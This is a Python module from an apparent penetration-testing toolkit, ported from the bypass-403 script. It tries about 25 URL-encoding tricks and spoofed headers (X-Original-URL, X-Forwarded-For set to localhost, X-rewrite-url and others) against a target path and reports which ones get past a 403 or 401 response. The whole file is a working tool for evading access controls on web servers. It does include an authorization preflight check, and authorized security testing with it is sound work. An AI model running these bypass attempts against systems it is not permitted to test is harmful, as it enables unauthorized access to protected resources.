#!/usr/bin/python3
"""
403 Bypasser — ported and extended from iamj0ker/bypass-403 (bash → Python).

Tests 25+ URL manipulation and header injection techniques to bypass
403 Forbidden and 401 Unauthorized responses.

Usage:
  ../.venv/bin/python3 modules/bypass_403.py -u https://target.com -p /admin
"""
import argparse
import urllib.parse

import requests
import urllib3

from core.colors import bold, underline, end, red, yellow, green, run, good, bad, info, tab
from core.auth_gate import preflight

urllib3.disable_warnings()


def _variants(base: str, path: str) -> list[tuple[str, str, dict]]:
    """Return list of (label, url, extra_headers) to try."""
    p  = path.lstrip("/")
    b  = base.rstrip("/")
    ep = urllib.parse.quote(p, safe="")
    variants = [
        # URL manipulation
        (f"/{p}",               f"{b}/{p}",                         {}),
        (f"/%2e/{p}",           f"{b}/%2e/{p}",                     {}),
        (f"/{p}/.",             f"{b}/{p}/.",                        {}),
        (f"//{p}//",            f"{b}//{p}//",                       {}),
        (f"/./{p}/./",          f"{b}/./{p}/./",                    {}),
        (f"/{p}%20",            f"{b}/{p}%20",                       {}),
        (f"/{p}%09",            f"{b}/{p}%09",                       {}),
        (f"/{p}?",              f"{b}/{p}?",                         {}),
        (f"/{p}.html",          f"{b}/{p}.html",                     {}),
        (f"/{p}/?anything",     f"{b}/{p}/?anything",                {}),
        (f"/{p}/*",             f"{b}/{p}/*",                        {}),
        (f"/{p}.php",           f"{b}/{p}.php",                      {}),
        (f"/{p}.json",          f"{b}/{p}.json",                     {}),
        (f"/{p}..;/",           f"{b}/{p}..;/",                      {}),
        (f"/{p};/",             f"{b}/{p};/",                        {}),
        (f"/{ep}",              f"{b}/{ep}",                         {}),
        # Header injection
        (f"X-Original-URL",     f"{b}/{p}",   {"X-Original-URL": f"/{p}"}),
        (f"X-Custom-IP",        f"{b}/{p}",   {"X-Custom-IP-Authorization": "127.0.0.1"}),
        (f"X-Forwarded-For 127",f"{b}/{p}",   {"X-Forwarded-For": "127.0.0.1"}),
        (f"X-Forwarded-For ::1",f"{b}/{p}",   {"X-Forwarded-For": "::1"}),
        (f"X-Host",             f"{b}/{p}",   {"X-Host": "127.0.0.1"}),
        (f"X-Forwarded-Host",   f"{b}/{p}",   {"X-Forwarded-Host": "127.0.0.1"}),
        (f"X-rewrite-url",      f"{b}",       {"X-rewrite-url": f"/{p}"}),
        (f"Referer",            f"{b}/{p}",   {"Referer": f"{b}/{p}"}),
        (f"Content-Length:0 POST",f"{b}/{p}", {"Content-Length": "0"}),
    ]
    return [(lbl, url, hdrs) for lbl, url, hdrs in variants]


def bypass(base: str, path: str, original_status: int = 403,
           timeout: float = 10.0) -> list[dict]:
    results = []
    default_headers = {"User-Agent": "Mozilla/5.0"}
    methods = {"Content-Length:0 POST": "POST"}

    for label, url, extra in _variants(base, path):
        h = {**default_headers, **extra}
        method = methods.get(label, "GET")
        try:
            r = requests.request(method, url, headers=h, timeout=timeout,
                                 verify=False, allow_redirects=False)
            status = r.status_code
            length = len(r.content)
            bypassed = status not in (original_status, 404)
            results.append({"label": label, "url": url, "headers": extra,
                            "status": status, "length": length,
                            "bypassed": bypassed})
        except Exception as e:
            results.append({"label": label, "url": url, "headers": extra,
                            "status": 0, "length": 0, "bypassed": False,
                            "error": str(e)})
    return results


def print_results(results: list[dict], original_status: int) -> None:
    bypassed = [r for r in results if r["bypassed"]]
    print(f"\n{bold}{underline}Results{end}  ({len(results)} techniques tested)\n")
    for r in results:
        if r.get("error"):
            col, sym = "", "  "
        elif r["bypassed"]:
            col, sym = green, "✓ "
        elif r["status"] == original_status:
            col, sym = red, "✗ "
        else:
            col, sym = yellow, "~ "
        sc   = r["status"] or "ERR"
        hdrs = f"  +{r['headers']}" if r["headers"] else ""
        print(f"  {col}{sym}{bold}{str(sc):<6}{end} [{r['length']:<7}]  {r['url']}{hdrs}")

    print()
    if bypassed:
        print(f"{good} {green}{bold}{len(bypassed)} bypass(es) found!{end}")
        for r in bypassed:
            print(f"  {tab}{green}{r['label']} → {r['status']} ({r['length']} bytes){end}")
    else:
        print(f"{bad} No bypasses found (all returned {original_status} or 404).")


def main():
    parser = argparse.ArgumentParser(description="Test 25+ 403/401 bypass techniques")
    parser.add_argument("-u", dest="url",  required=True, help="Base URL (e.g. https://target.com)")
    parser.add_argument("-p", dest="path", required=True, help="Path to bypass (e.g. /admin)")
    parser.add_argument("--expected", type=int, default=403,
                        help="Expected blocked status code (default: 403)")
    args = parser.parse_args()
    preflight('bypass_403', args.url, active=True)

    print(f"{run} Testing {bold}{args.url}/{args.path.lstrip('/')}{end}  (expecting {args.expected})")
    results = bypass(args.url, args.path, original_status=args.expected)
    print_results(results, args.expected)


if __name__ == "__main__":
    main()
